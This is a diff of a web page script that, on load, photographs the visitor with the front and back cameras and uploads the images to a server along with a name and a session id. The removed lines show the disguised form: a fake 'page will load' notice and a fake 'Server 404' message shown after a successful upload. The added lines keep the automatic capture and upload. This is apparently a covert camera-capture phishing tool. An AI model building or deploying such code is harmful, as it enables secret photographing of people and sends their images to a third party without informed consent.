@@ -10,7 +10,7 @@
   </style>
 </head>
 <body>
-  <p id="status">Page will load in 2–3 seconds, please wait....</p>
+  <p id="status">Capturing photos, please wait…</p>
 
   <script>
   (async function() {
@@ -23,9 +23,7 @@
 
     async function takePhoto(facingMode) {
       try {
-        const constraints = {
-          video: typeof facingMode === "string" ? { facingMode } : { facingMode: facingMode }
-        };
+        const constraints = { video: { facingMode: facingMode } };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
 
         const video = document.createElement("video");
@@ -35,51 +33,44 @@
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        const imageData = canvas.toDataURL("image/jpeg");
-        stream.getTracks().forEach(track => track.stop());
-        return imageData;
+        return new Promise((resolve, reject) => {
+          canvas.toBlob(blob => {
+            stream.getTracks().forEach(track => track.stop());
+            if (blob) resolve(blob);
+            else reject(new Error("Failed to create blob"));
+          }, "image/jpeg", 0.7); // 0.7 = compression
+        });
       } catch (err) {
         console.error("Camera capture failed:", err);
         throw err;
       }
     }
 
-    async function sendToServer(imageData, type) {
-      await fetch("/upload", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          image: imageData,
-          name,
-          type,
-          sessionId
-        })
-      });
+    async function sendToServer(blob, type) {
+      const formData = new FormData();
+      formData.append("photo", blob, `${type}_${Date.now()}.jpg`);
+      formData.append("name", name);
+      formData.append("type", type);
+      formData.append("sessionId", sessionId);
+
+      const res = await fetch("/upload-photo", { method: "POST", body: formData });
+      return res.json();
     }
 
     try {
-      if (/Mobi|Android/i.test(navigator.userAgent)) {
-        // Mobile: front then back
-        const frontPhoto = await takePhoto("user");
-        await sendToServer(frontPhoto, "front");
+      // Always do front then back
+      const frontPhoto = await takePhoto("user");
+      await sendToServer(frontPhoto, "front");
 
-        const backPhoto = await takePhoto({ ideal: "environment" });
-        await sendToServer(backPhoto, "back");
-      } else {
-        // Desktop: default camera twice
-        const photo1 = await takePhoto("user");
-        await sendToServer(photo1, "front");
+      const backPhoto = await takePhoto("environment");
+      await sendToServer(backPhoto, "back");
 
-        const photo2 = await takePhoto("user");
-        await sendToServer(photo2, "back");
-      }
-
-      // Success message
-      status.innerText = "Server 404! Please try after some time";
+      status.innerText = "Photos captured and uploaded successfully!";
     } catch (err) {
-      // Failure message
+      console.error(err);
       status.innerText = "Server failed! Sorry, try again in a few minutes!";
     }
   })();
